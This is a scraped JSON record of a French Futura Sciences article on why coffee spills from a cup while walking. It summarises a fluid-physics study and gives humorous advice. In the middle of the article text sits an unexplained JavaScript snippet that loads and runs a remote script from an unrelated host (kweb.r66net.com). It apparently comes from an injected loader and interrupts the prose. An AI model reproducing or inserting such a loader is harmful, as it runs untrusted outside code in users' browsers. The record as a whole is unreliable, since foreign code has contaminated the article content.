{"title": "Science décalée : comment ne pas renverser son café en marchant ?", "newspaper": "Futura Sciences", "author": "Par Janlou Chaput, Futura", "date_publi": "25/11/2017", "content": "Tout le monde l'a déjà vécu, pourtant personne n'avait cherché à en comprendre le pourquoi. Pourquoi le café se renverse quand on marche la tasse à la main ? Une histoire de fréquences, de jambes, de mouvements et de contenant. Voici les conseils pour rejoindre son bureau depuis la machine à café sans passer par la case serpillière ! La pause café relève de la tradition. S'aérer l'esprit, se changer les idées, souffler un peu et absorber un peu de  caféine , ce stimulant cérébral. Mais voilà, bien souvent, le  liquide  déborde de sa tasse et on noircit le couloir, ou pire, la  moquette . Heureusement, la science vient en aide à tous les maladroits qui sont condamnés à boire seulement la moitié de leur  café . Le contexte : peu importe le flacon, pourvu qu’on ait la caféine Le café est l'une des denrées les plus échangées dans le  commerce  mondial. Cette substance psychoactive est consommée sur toute la surface de la Planète, mais surtout dans les pays développés. Ce qu'on recherche : la caféine (ou plutôt la 1,3,7-triméthylxanthine, pour les puristes), aux propriétés  psychotropes . Les Scandinaves sont les champions de sa consommation, puisque chacun d'eux en ingurgite en moyenne une dizaine de  kilogrammes  chaque année.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Au fil du temps, le café a acquis des vertus sociales. La plupart des entreprises ne peuvent se passer de leur traditionnelle pause café, moment pendant lequel chacun se retrouve autour d'une  boisson  chaude, oublie quelques minutes la charge de travail qui l'attend en discutant de la pluie et du beau temps (ou d'autres choses) avec ses collègues. Le café est extrait des graines du caféier, un arbuste qui pousse dans les régions tropicales. © public-domain-image.com                               Dans le lot, il y en a toujours un qui, se laissant emporter par son discours ou voulant perdre le moins de temps possible, déverse la moitié de sa tasse sur le sol. Chacun de nous doit s'y reconnaître plus ou moins... Pourquoi sommes-nous si maladroit ? Enfin la réponse nous est parvenue de l' université de Californie , à Santa Barbara plus précisément, quand deux spécialistes de la  physique  des fluides ont traité le problème. Leur solution est exposée dans la revue  Physical Review E . L’étude : des réservoirs des missiles aux tasses de café Que les choses soient claires : il s'agit d'un complot international fomenté par nos jambes, nos  mouvements , et surtout le contenant ! Les deux auteurs ont comparé la fréquence de nos foulées avec celle de l'oscillation du café dans sa tasse. Elles sont très proches, mais légèrement différentes. À chaque pas, le balancement du  café  s'amplifie. En moyenne, la catastrophe se produit entre la septième et la dixième de nos foulées. En étudiant des récipients de formats différents et des démarches à  vitesses  variables, un  modèle mathématique  a pu être établi. Et pour celles et ceux qui en ont assez de renverser leur précieux liquide, l'étude fournit également son lot de conseils pratiques. Enfin, pratiques, cela reste à vérifier. Espresso, cappuccino, au lait... le café se prépare de différentes façons. Mais la moins bonne d'entre toutes, c'est quand il est renversé. © Mark Prince, Wikipédia, DP                               Les erreurs à ne pas commettre : marcher vite, car ceux qui croient que ce phénomène est dépendant du temps et qu'en raccourcissant la  durée  du parcours on se prémunira d'une chute de  café , courent au devant de déconvenues certaines. Les oscillations dans la tasse sont amplifiées et quelques pas suffisent à perdre tout le contenu ; regarder devant soi. Lorsqu'on focalise son attention sur sa tasse, on avance d'une part moins vite car on ne sait pas où on va (il faut tout de même veiller à éviter les chocs frontaux avec un collègue), mais nos poignets compensent automatiquement les balancements du café dans son bol ; vouloir accélérer trop vite. Passer de 0 à 30 km/h en 2,6 s impressionne peut-être certains de vos collègues, mais n'est guère compatible avec un liquide chaud qui doit rester dans sa tasse. Une accélération progressive est cependant conseillée pour les plus pressés ; ne pas faire ses lacets. Cela relève de l'évidence, mais lorsqu'on trébuche, on entraîne inéluctablement dans sa chute sa boisson chaude. NB : ce conseil pourrait ne pas valoir en  apesanteur . Enfin, pour limiter davantage les risques, nos deux auteurs, qui comptent probablement passer leur doctorat de  serveur , préconisent des solutions nouvelles en s'inspirant des recherches de la mécanique des fluides menées pour mieux comprendre les mouvements des carburants dans les  missiles . Selon eux, il faudrait probablement changer de contenant. Au lieu de tasses, de mugs ou de gobelets, un récipient souple absorberait bien mieux les oscillations. Un sac  plastique  devrait faire l'affaire... Reste à trouver la solution à un nouveau problème qui risque de se poser : comment boire sans en mettre la moitié sur sa chemise ? Mais ceci est une autre question ! L’œil extérieur : une étude qui tombe à l’eau ? Effectivement, rares sont ceux qui ont échappé au supplice de la serpillière pour avoir renversé leur boisson par  terre . Le bon sens et l'expérience ne suffisaient-ils pas à maîtriser les techniques de base pour éviter que ce genre de mésaventure ne se produise trop souvent ? Sûrement. Cela est ouvert au débat, mais ne peut-on pas considérer que tout savoir est bon à prendre ? ", "theme": "sciences"}